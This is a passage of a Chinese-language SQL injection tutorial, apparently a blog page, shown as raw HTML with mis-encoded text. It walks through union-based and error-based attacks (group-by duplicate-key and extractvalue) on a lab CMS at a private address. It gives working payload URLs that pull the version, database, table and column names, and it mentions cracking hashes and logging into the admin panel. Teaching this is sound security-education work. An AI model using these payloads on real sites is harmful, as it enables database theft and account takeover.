å¿…è¦æ¡ä»¶"></a>4.2 å¿…è¦æ¡ä»¶</h2><ul><li><p>ä¸¤å¼ è™šæ‹Ÿçš„è¡¨å…·æœ‰ç›¸åŒçš„åˆ—æ•°</p></li><li><p>è™šæ‹Ÿè¡¨å¯¹åº”çš„åˆ—çš„æ•°æ®ç±»å‹ç›¸åŒ</p></li></ul><h2 id="4-3-åˆ¤æ–­å­—æ®µä¸ªæ•°"><a href="#4-3-åˆ¤æ–­å­—æ®µä¸ªæ•°" class="headerlink" title="4.3 åˆ¤æ–­å­—æ®µä¸ªæ•°"></a>4.3 åˆ¤æ–­å­—æ®µä¸ªæ•°</h2><h3 id="4-3-1-order-by"><a href="#4-3-1-order-by" class="headerlink" title="4.3.1 order by"></a>4.3.1 order by</h3><ul><li>æ–¹æ³•åŸç†</li></ul><p>å¯ä»¥ä½¿ç”¨[order by]è¯­å¥æ¥åˆ¤æ–­å½“å‰selectè¯­å¥æ‰€æŸ¥è¯¢çš„è™šæ‹Ÿè¡¨çš„åˆ—æ•°ã€‚ [order by]è¯­å¥æœ¬æ„æ˜¯æŒ‰ç…§æŸä¸€åˆ—è¿›è¡Œæ’åºï¼Œ åœ¨mysqlä¸­å¯ä»¥ä½¿ç”¨æ•°å­—æ¥ä»£æ›¿å…·ä½“çš„åˆ—åï¼Œæ¯”å¦‚[order by 1] å°±æ˜¯æŒ‰ç…§ç¬¬ä¸€åˆ—è¿›è¡Œæ’åºï¼Œ å¦‚æœmysqlæ²¡æœ‰æ‰¾åˆ°å¯¹åº”çš„åˆ—ï¼Œå°±ä¼šæŠ¥é”™[Unknown co Lumn]ã€‚æˆ‘ä»¬å¯ä»¥ä¾æ¬¡å¢åŠ æ•°å­—ï¼Œç›´åˆ°æ•°æ®åº“æŠ¥é”™ã€‚</p><ul><li>æ¡ˆä¾‹ï¼š</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122165104614-2265467.png" alt="order byåˆ¤æ–­å­—æ®µä¸ªæ•°ç¤ºä¾‹" style="zoom:80%;"><h3 id="4-3-2-union-select"><a href="#4-3-2-union-select" class="headerlink" title="4.3.2 union select"></a>4.3.2 union select</h3><p>union select null,null,â€”,nullâ€“+</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.33.4/cms/show.php?id<span class="token operator">=</span><span class="token number">35</span> union <span class="token keyword">select</span> null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--+http://192.168.33.4/cms/show.php?id<span class="token operator">=</span><span class="token number">35</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,3,4,5,6,7,8,9,10,11,12,13,14,15--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>æ¡ˆä¾‹</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122165338390-2265620.png" alt="union selectåˆ¤æ–­å­—æ®µä¸ªæ•°ç¤ºä¾‹" style="zoom:90%;"><ul><li>ä½¿ç”¨hackbaræ’ä»¶</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122165422148.png" alt="hackbaræ’ä»¶ä½¿ç”¨ç¤ºä¾‹" style="zoom:80%;"><h2 id="4-4-åˆ¤æ–­æ•°æ®æ˜¾ç¤ºä½ç½®"><a href="#4-4-åˆ¤æ–­æ•°æ®æ˜¾ç¤ºä½ç½®" class="headerlink" title="4.4 åˆ¤æ–­æ•°æ®æ˜¾ç¤ºä½ç½®"></a>4.4 åˆ¤æ–­æ•°æ®æ˜¾ç¤ºä½ç½®</h2><p>å¾—åˆ°å­—æ®µä¸ªæ•°ä¹‹åï¼Œå¯ä»¥å°è¯•æ„é€ è”åˆæŸ¥è¯¢è¯­å¥ã€‚<br>       è¿™é‡Œæˆ‘ä»¬å¹¶ä¸çŸ¥é“è¡¨åï¼Œæ ¹æ®mysqlæ•°æ®åº“ç‰¹æ€§ï¼Œselectè¯­å¥åœ¨æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œå¹¶ä¸éœ€è¦æŒ‡å®šè¡¨åã€‚<br>       [?id=33 union select 1,2,3,4,5,6,7,8,9,10,11, 12,13,14,15â€“+]<br>       [?id=33 union select null, null, null, null, null, null, null, null, null, null, null, null, null, null,nullâ€“+]<br>      é¡µé¢æ˜¾ç¤ºçš„æ˜¯ç¬¬ä¸€å¼ è™šæ‹Ÿè¡¨çš„å†…å®¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è€ƒè™‘è®©ç¬¬ä¸€å¼ è™šæ‹Ÿè¡¨çš„æŸ¥è¯¢æ¡ä»¶ä¸ºå‡ï¼Œåˆ™æ˜¾ç¤ºç¬¬äºŒæ¡è®°å½•ã€‚å› æ­¤æ„é€ SQLè¯­å¥:<br>      [?id=33 and 1=2 union select 1,2,3,4,5,6,7,8,9, 10,11, 12,13,14,15 â€“+]<br>      [?id=-33 union select 1,2,3,4,5,6, 7,8,9,10, 11,12,13,14,15 â€“+]</p><ul><li>æ¡ˆä¾‹</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122165657390.png" alt="åˆ¤æ–­æ•°æ®æ˜¾ç¤ºä½ç½®" style="zoom:80%;"><h2 id="4-6-æ•°æ®åº“åå’Œæ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯è·å–"><a href="#4-6-æ•°æ®åº“åå’Œæ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯è·å–" class="headerlink" title="4.6 æ•°æ®åº“åå’Œæ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯è·å–"></a>4.6 æ•°æ®åº“åå’Œæ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯è·å–</h2><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122165724657-2265846.png" alt="æ•°æ®åº“åå’Œæ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯è·å–" style="zoom:80%;"><p>version()å‡½æ•°è·å–ç‰ˆæœ¬ä¿¡æ¯ã€‚</p><h2 id="4-7-è·å–ç›®æ ‡æ•°æ®åº“æ•°æ®è¡¨å"><a href="#4-7-è·å–ç›®æ ‡æ•°æ®åº“æ•°æ®è¡¨å" class="headerlink" title="4.7 è·å–ç›®æ ‡æ•°æ®åº“æ•°æ®è¡¨å"></a>4.7 è·å–ç›®æ ‡æ•°æ®åº“æ•°æ®è¡¨å</h2><h3 id="4-7-1-æš´åŠ›ç ´è§£çš„æ€è·¯"><a href="#4-7-1-æš´åŠ›ç ´è§£çš„æ€è·¯" class="headerlink" title="4.7.1 æš´åŠ›ç ´è§£çš„æ€è·¯"></a>4.7.1 æš´åŠ›ç ´è§£çš„æ€è·¯</h3><ul><li>æ¡ˆä¾‹</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122165838388.png" alt="æš´åŠ›ç ´è§£çš„æ€è·¯" style="zoom:80%;"><h3 id="4-7-2-åˆ©ç”¨information-schemaæ•°æ®åº“è·å–"><a href="#4-7-2-åˆ©ç”¨information-schemaæ•°æ®åº“è·å–" class="headerlink" title="4.7.2 åˆ©ç”¨information_schemaæ•°æ®åº“è·å–"></a>4.7.2 åˆ©ç”¨information_schemaæ•°æ®åº“è·å–</h3><ul><li>è·å–æ€è·¯</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122165934014.png" alt="image-20241122165934014" style="zoom:90%;"><ul><li>è·å–å…³äºç›®æ ‡æ•°æ®åº“çš„æ‰€æœ‰è¡¨å</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122170057236.png" alt="è·å–å…³äºç›®æ ‡æ•°æ®åº“çš„æ‰€æœ‰è¡¨å" style="zoom:80%;"><h2 id="4-8-è·å–ç›®æ ‡æ•°æ®è¡¨å­—æ®µå"><a href="#4-8-è·å–ç›®æ ‡æ•°æ®è¡¨å­—æ®µå" class="headerlink" title="4.8 è·å–ç›®æ ‡æ•°æ®è¡¨å­—æ®µå"></a>4.8 è·å–ç›®æ ‡æ•°æ®è¡¨å­—æ®µå</h2><pre class="line-numbers language-latex" data-language="latex"><code class="language-latex">http://192.168.33.4/cms/show.php?id=-35 union select 1,2,3,4,5,6,7,8,9,10,hex(group_concat(column_name)),12,13,14,15 from information_schema.columns where table_schema=database() and table_name=cms_users--+ ä¸ºäº†é¿å…å•å¼•å·çš„ä½¿ç”¨ï¼Œå°†cms_usersè½¬åŒ–æˆåå…­è¿›åˆ¶å½¢å¼ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>æ¡ˆä¾‹</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122170337710.png" alt="è·å–ç›®æ ‡æ•°æ®è¡¨å­—æ®µå" style="zoom:80%;"><h2 id="4-8-è·å–å­—æ®µçš„å€¼"><a href="#4-8-è·å–å­—æ®µçš„å€¼" class="headerlink" title="4.8 è·å–å­—æ®µçš„å€¼"></a>4.8 è·å–å­—æ®µçš„å€¼</h2><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122170421214.png" alt="è·å–å­—æ®µçš„å€¼" style="zoom:80%;"><h2 id="4-9-è§£å¯†hashå€¼"><a href="#4-9-è§£å¯†hashå€¼" class="headerlink" title="4.9 è§£å¯†hashå€¼"></a>4.9 è§£å¯†hashå€¼</h2><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122170556162.png" alt="è§£å¯†hashå€¼" style="zoom:80%;"><h2 id="4-10-ç™»å½•åå°"><a href="#4-10-ç™»å½•åå°" class="headerlink" title="4.10 ç™»å½•åå°"></a>4.10 ç™»å½•åå°</h2><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122170615237-2266376.png" alt="ç™»å½•åå°" style="zoom:80%;"><h1 id="äº”ã€æŠ¥é”™æ³¨å…¥"><a href="#äº”ã€æŠ¥é”™æ³¨å…¥" class="headerlink" title="äº”ã€æŠ¥é”™æ³¨å…¥"></a>äº”ã€æŠ¥é”™æ³¨å…¥</h1><p>åœ¨æ³¨å…¥ç‚¹çš„åˆ¤æ–­è¿‡ç¨‹ä¸­ï¼Œå‘ç°æ•°æ®åº“ä¸­SQLè¯­å¥çš„æŠ¥é”™ä¿¡æ¯ï¼Œä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸­ï¼Œå› æ­¤å¯ä»¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥ã€‚</p><p>æŠ¥é”™æ³¨å…¥çš„åŸç†ï¼Œå°±æ˜¯åœ¨é”™è¯¯ä¿¡æ¯ä¸­æ‰§è¡ŒSQLè¯­å¥ã€‚è§¦å‘æŠ¥é”™çš„æ–¹å¼å¾ˆå¤šï¼Œå…·ä½“ç»†èŠ‚ä¹Ÿä¸å°½ç›¸åŒã€‚æ­¤å¤„å»ºè®®ç›´æ¥èƒŒå…¬å¼å³å¯ã€‚</p><h2 id="5-1-group-byé‡å¤é”®å†²çª"><a href="#5-1-group-byé‡å¤é”®å†²çª" class="headerlink" title="5.1 group byé‡å¤é”®å†²çª"></a>5.1 group byé‡å¤é”®å†²çª</h2><p>group by æ˜¯mysqlå¤©ç”Ÿçš„ç¼ºé™·,æˆåŠŸç‡é«˜ã€‚</p><blockquote><h4 id="group-byå’Œèšåˆå‡½æ•°çš„ç†è§£"><a href="#group-byå’Œèšåˆå‡½æ•°çš„ç†è§£" class="headerlink" title="group byå’Œèšåˆå‡½æ•°çš„ç†è§£"></a>group byå’Œèšåˆå‡½æ•°çš„ç†è§£</h4><p>çœ‹ä¸‹è¡¨1ï¼Œè¡¨åä¸ºtestï¼š</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-13%20%E4%B8%8B%E5%8D%886.52.17.png" style="zoom:45%;"><p>æ‰§è¡Œå¦‚ä¸‹SQLè¯­å¥ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">SELECT  name  FROM  <span class="token builtin class-name">test</span> GROUP  BY  name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¡¨2:</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-13%20%E4%B8%8B%E5%8D%886.52.55.png" style="zoom:75%;"><p>ç”±è¡¨1åˆ°è¡¨2çš„è¿‡ç¨‹ä¸­ï¼Œå¢åŠ ä¸€ä¸ªè™šæ„çš„ä¸­é—´è¡¨ï¼šè™šæ‹Ÿè¡¨3ã€‚</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-13%20%E4%B8%8B%E5%8D%886.54.11.png" style="zoom:40%;"><p>æ¥ä¸‹æ¥å°±è¦é’ˆå¯¹è™šæ‹Ÿè¡¨3æ‰§è¡ŒSelectè¯­å¥äº†ï¼š</p><p>ï¼ˆ1ï¼‰å¦‚æœæ‰§è¡Œselect *çš„è¯ï¼Œé‚£ä¹ˆè¿”å›çš„ç»“æœåº”è¯¥æ˜¯è™šæ‹Ÿè¡¨3ï¼Œå¯æ˜¯idå’Œnumberä¸­æœ‰çš„å•å…ƒæ ¼é‡Œé¢çš„å†…å®¹æ˜¯å¤šä¸ªå€¼çš„ï¼Œè€Œå…³ç³»æ•°æ®åº“å°±æ˜¯åŸºäºå…³ç³»çš„ï¼Œå•å…ƒæ ¼ä¸­æ˜¯ä¸å…è®¸æœ‰å¤šä¸ªå€¼çš„ï¼Œæ‰€ä»¥ä½ çœ‹ï¼Œæ‰§è¡Œselect * è¯­å¥å°±æŠ¥é”™äº†ã€‚</p><p>ï¼ˆ2ï¼‰æˆ‘ä»¬å†çœ‹nameåˆ—ï¼Œæ¯ä¸ªå•å…ƒæ ¼åªæœ‰ä¸€ä¸ªæ•°æ®ï¼Œæ‰€ä»¥æˆ‘ä»¬select nameçš„è¯ï¼Œå°±æ²¡æœ‰é—®é¢˜äº†ã€‚ä¸ºä»€ä¹ˆnameåˆ—æ¯ä¸ªå•å…ƒæ ¼åªæœ‰ä¸€ä¸ªå€¼å‘¢ï¼Œå› ä¸ºæˆ‘ä»¬å°±æ˜¯ç”¨nameåˆ—æ¥group byçš„ã€‚</p><p>ï¼ˆ3ï¼‰é‚£ä¹ˆå¯¹äºidå’Œnumberé‡Œé¢çš„å•å…ƒæ ¼æœ‰å¤šä¸ªæ•°æ®çš„æƒ…å†µæ€ä¹ˆåŠå‘¢ï¼Ÿç­”æ¡ˆå°±æ˜¯ç”¨èšåˆå‡½æ•°ï¼Œèšåˆå‡½æ•°å°±ç”¨æ¥è¾“å…¥å¤šä¸ªæ•°æ®ï¼Œè¾“å‡ºä¸€ä¸ªæ•°æ®çš„ã€‚å¦‚cout(id)ï¼Œsum(number)ï¼Œè€Œæ¯ä¸ªèšåˆå‡½æ•°çš„è¾“å…¥å°±æ˜¯æ¯ä¸€ä¸ªå¤šæ•°æ®çš„å•å…ƒæ ¼ã€‚</p><p>ï¼ˆ4ï¼‰ä¾‹å¦‚æˆ‘ä»¬æ‰§è¡Œselect name,sum(number) from test group by nameï¼Œé‚£ä¹ˆsumå°±å¯¹è™šæ‹Ÿè¡¨3çš„numberåˆ—çš„æ¯ä¸ªå•å…ƒæ ¼è¿›è¡Œsumæ“ä½œï¼Œä¾‹å¦‚å¯¹nameä¸ºaaçš„é‚£ä¸€è¡Œçš„numberåˆ—æ‰§è¡Œsumæ“ä½œï¼Œå³2+3ï¼Œè¿”å›5ï¼Œæœ€åæ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-13%20%E4%B8%8B%E5%8D%887.00.15.png" style="zoom:45%;"><p>ï¼ˆ5ï¼‰group by å¤šä¸ªå­—æ®µè¯¥æ€ä¹ˆç†è§£å‘¢ï¼šå¦‚group by name,numberï¼Œæˆ‘ä»¬å¯ä»¥æŠŠnameå’Œnumber çœ‹æˆä¸€ä¸ª<strong>æ•´ä½“å­—æ®µ</strong>ï¼Œä»¥ä»–ä»¬æ•´ä½“æ¥è¿›è¡Œåˆ†ç»„çš„ã€‚å¦‚ä¸‹å›¾</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-13%20%E4%B8%8B%E5%8D%887.00.44.png" style="zoom:45%;"><p>ï¼ˆ6ï¼‰æ¥ä¸‹æ¥å°±å¯ä»¥é…åˆselectå’Œèšåˆå‡½æ•°è¿›è¡Œæ“ä½œäº†ã€‚å¦‚æ‰§è¡Œselect name,sum(id) from test group by name,numberï¼Œç»“æœå¦‚ä¸‹å›¾ï¼š</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-13%20%E4%B8%8B%E5%8D%887.01.17.png" style="zoom:45%;"></blockquote><h3 id="5-1-1-Payload1"><a href="#5-1-1-Payload1" class="headerlink" title="5.1.1 Payload1"></a>5.1.1 Payload1</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?id<span class="token operator">=</span><span class="token number">33</span> and <span class="token punctuation">(</span>select <span class="token number">1</span> from <span class="token punctuation">(</span>select count<span class="token punctuation">(</span>*<span class="token punctuation">)</span> , concat<span class="token punctuation">(</span> <span class="token punctuation">(</span>select version<span class="token punctuation">(</span><span class="token punctuation">)</span> frominformation_schema.tables limit <span class="token number">0,1</span><span class="token punctuation">)</span> , floor<span class="token punctuation">(</span> rand<span class="token punctuation">(</span> <span class="token punctuation">)</span>*2<span class="token punctuation">))</span>x from information_schema.tablesgroup by x<span class="token punctuation">)</span>a<span class="token punctuation">)</span> --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><h4 id="EXï¼šgroup-byé‡å¤é”®å†²çªæŠ¥é”™æ³¨å…¥"><a href="#EXï¼šgroup-byé‡å¤é”®å†²çªæŠ¥é”™æ³¨å…¥" class="headerlink" title="EXï¼šgroup byé‡å¤é”®å†²çªæŠ¥é”™æ³¨å…¥"></a>EXï¼šgroup byé‡å¤é”®å†²çªæŠ¥é”™æ³¨å…¥</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.33.4/cms/show.php?id<span class="token operator">=</span><span class="token number">33</span> and <span class="token punctuation">(</span>select <span class="token number">1</span> from <span class="token punctuation">(</span>select count<span class="token punctuation">(</span>*<span class="token punctuation">)</span>,concat<span class="token variable"><span class="token punctuation">((</span>select version<span class="token punctuation">(</span><span class="token punctuation">)</span> from information_schema.tables limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span> <span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">))</span></span>x from information_schema.tables group by x<span class="token punctuation">)</span>a<span class="token punctuation">)</span> --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-04-12%20%E4%B8%8B%E5%8D%888.07.01.png" style="zoom:75%;"><p><code>Duplicate entry '5.5.530' for key 'group_key'</code></p><p>æˆåŠŸåœ¨æŠ¥é”™ä¿¡æ¯ä¸­è·å¾—ç‰ˆæœ¬ä¿¡æ¯ã€‚</p><p>å°è¯•è·å¾—æ•°æ®åº“åä¿¡æ¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.33.4/cms/show.php?id<span class="token operator">=</span><span class="token number">33</span> and <span class="token punctuation">(</span>select <span class="token number">1</span> from <span class="token punctuation">(</span>select count<span class="token punctuation">(</span>*<span class="token punctuation">)</span>,concat<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">)</span> from information_schema.tables limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span> <span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">))</span></span>x from information_schema.tables group by x<span class="token punctuation">)</span>a<span class="token punctuation">)</span> --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä¸ç¨³å®šï¼Œéœ€è¦å¤šæ¬¡æ‰§è¡Œã€‚</p><p>åˆ©ç”¨å…¶ä»–çš„sqlè¯­å¥ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.33.4/cms/show.php?id<span class="token operator">=</span><span class="token number">33</span> and <span class="token punctuation">(</span>select <span class="token number">1</span> from <span class="token punctuation">(</span>select count<span class="token punctuation">(</span>*<span class="token punctuation">)</span>,concat<span class="token variable"><span class="token punctuation">((</span>è¯­å¥å†™åœ¨è¿™é‡Œ<span class="token punctuation">)</span><span class="token punctuation">,</span> floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span> <span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">))</span></span>x from information_schema.tables group by x<span class="token punctuation">)</span>a<span class="token punctuation">)</span> --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h3 id="5-1-2-ç®€åŒ–ç‰ˆæœ¬"><a href="#5-1-2-ç®€åŒ–ç‰ˆæœ¬" class="headerlink" title="5.1.2 ç®€åŒ–ç‰ˆæœ¬"></a>5.1.2 ç®€åŒ–ç‰ˆæœ¬</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?id<span class="token operator">=</span><span class="token number">33</span> union <span class="token keyword">select</span> <span class="token number">1</span>, <span class="token number">2</span>, concat<span class="token punctuation">(</span>left <span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> ,3<span class="token punctuation">)</span> , <span class="token string">'^'</span> , <span class="token punctuation">(</span>select version<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> , <span class="token string">'^'</span> <span class="token punctuation">)</span>a, count<span class="token punctuation">(</span>*<span class="token punctuation">)</span> ,5, <span class="token number">6</span>, <span class="token number">7,8</span>,9,10, <span class="token number">11</span>, <span class="token number">12</span>, <span class="token number">13</span>, <span class="token number">14,15</span> from information_ schema.tables group by a --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h4 id="EXï¼šgroup-byé‡å¤é”®å†²çªæŠ¥é”™æ³¨å…¥-1"><a href="#EXï¼šgroup-byé‡å¤é”®å†²çªæŠ¥é”™æ³¨å…¥-1" class="headerlink" title="EXï¼šgroup byé‡å¤é”®å†²çªæŠ¥é”™æ³¨å…¥"></a>EXï¼šgroup byé‡å¤é”®å†²çªæŠ¥é”™æ³¨å…¥</h4><ul><li>è·å–æ•°æ®åº“ç‰ˆæœ¬å’Œæ•°æ®åº“å:</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.33.4/cms/show.php?id<span class="token operator">=</span><span class="token number">33</span> union <span class="token keyword">select</span> <span class="token number">1</span>, <span class="token number">2</span>, concat <span class="token punctuation">(</span>left <span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> ,3<span class="token punctuation">)</span> , <span class="token string">'|'</span> , <span class="token punctuation">(</span>select version<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> , <span class="token string">'|'</span> <span class="token punctuation">)</span>a, count<span class="token punctuation">(</span>*<span class="token punctuation">)</span> ,5, <span class="token number">6</span>, <span class="token number">7,8</span>,9,10, <span class="token number">11</span>, <span class="token number">12</span>, <span class="token number">13</span>, <span class="token number">14,15</span> from information_schema.tables group by a --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-07-25%20%E4%B8%8A%E5%8D%8810.33.37.png" style="zoom:55%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.33.4/cms/show.php?id<span class="token operator">=</span><span class="token number">99</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>, concat <span class="token punctuation">(</span>left <span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> ,3<span class="token punctuation">)</span> , <span class="token string">'|'</span> , <span class="token punctuation">(</span>select version<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> , <span class="token string">'|'</span> <span class="token punctuation">)</span>a,count<span class="token punctuation">(</span>*<span class="token punctuation">)</span>,5,6,7,8,9,10,11,12,13,14,15--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-07-25%20%E4%B8%8A%E5%8D%8810.33.05.png" style="zoom:75%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.33.4/cms/show.php?id<span class="token operator">=</span><span class="token number">99</span>%20union%20select%201,2, concat <span class="token punctuation">(</span>left <span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> ,3<span class="token punctuation">)</span> , <span class="token string">'|'</span> , <span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> , <span class="token string">'|'</span> <span class="token punctuation">)</span>a,count<span class="token punctuation">(</span>*<span class="token punctuation">)</span>,5,6,7,8,9,10,11,12,13,14,15 from information_schema.tables group by a--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-07-25%20%E4%B8%8A%E5%8D%8810.35.19.png" style="zoom:75%;"><ul><li><h4 id="è·å–æ•°æ®åº“æ‰€æœ‰è¡¨å"><a href="#è·å–æ•°æ®åº“æ‰€æœ‰è¡¨å" class="headerlink" title="è·å–æ•°æ®åº“æ‰€æœ‰è¡¨å"></a>è·å–æ•°æ®åº“æ‰€æœ‰è¡¨å</h4></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.33.4/cms/show.php?id<span class="token operator">=</span><span class="token number">99</span>%20union%20select%201,2, concat <span class="token punctuation">(</span>left <span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> ,3<span class="token punctuation">)</span> , <span class="token string">'|'</span> , <span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> , <span class="token string">'|'</span> <span class="token punctuation">)</span>a,count<span class="token punctuation">(</span>*<span class="token punctuation">)</span>,5,6,7,8,9,10,11,12,13,14,15 from information_schema.tables group by a--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre><code>    Illegal mix of collations for operation 'UNION'</code></pre><p>å°†group_concat(table_name) â€”â€”&gt; hex(group_concat(table_name) )</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.33.4/cms/show.php?id<span class="token operator">=</span><span class="token number">99</span>%20union%20select%201,2, concat <span class="token punctuation">(</span>left <span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> ,3<span class="token punctuation">)</span> , <span class="token string">'|'</span> , <span class="token punctuation">(</span>select hex<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token punctuation">)</span> from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> , <span class="token string">'|'</span> <span class="token punctuation">)</span>a,count<span class="token punctuation">(</span>*<span class="token punctuation">)</span>,5,6,7,8,9,10,11,12,13,14,15 from information_schema.tables group by a--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-07-25%20%E4%B8%8A%E5%8D%8810.42.28.png" style="zoom:75%;"><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2021-07-25%20%E4%B8%8A%E5%8D%8810.43.05.png" style="zoom:50%;"></blockquote><h3 id="5-1-3-å…¶ä»–payload"><a href="#5-1-3-å…¶ä»–payload" class="headerlink" title="5.1.3 å…¶ä»–payload"></a>5.1.3 å…¶ä»–payload</h3><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20250212175318410.png" style="zoom:80%;"><h2 id="5-2-XPATHæŠ¥é”™æ³¨å…¥"><a href="#5-2-XPATHæŠ¥é”™æ³¨å…¥" class="headerlink" title="5.2 XPATHæŠ¥é”™æ³¨å…¥"></a>5.2 XPATHæŠ¥é”™æ³¨å…¥</h2><p>ä½ç‰ˆæœ¬æ¯”å¦‚5.0ä»¥ä¸‹ï¼Œå¯èƒ½ä¸æ”¯æŒXPAHTæŠ¥é”™ã€‚</p><h3 id="5-2-1-extractvalue"><a href="#5-2-1-extractvalue" class="headerlink" title="5.2.1 extractvalue( )"></a>5.2.1 extractvalue( )</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?id<span class="token operator">=</span><span class="token number">33</span> and extractvalue<span class="token punctuation">(</span><span class="token number">1</span>, concat<span class="token punctuation">(</span><span class="token string">'^'</span>, <span class="token punctuation">(</span>select version<span class="token punctuation">(</span><span class="token punctuation">))</span>, <span class="token string">'^'</span><span class="token punctuation">))</span> --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img 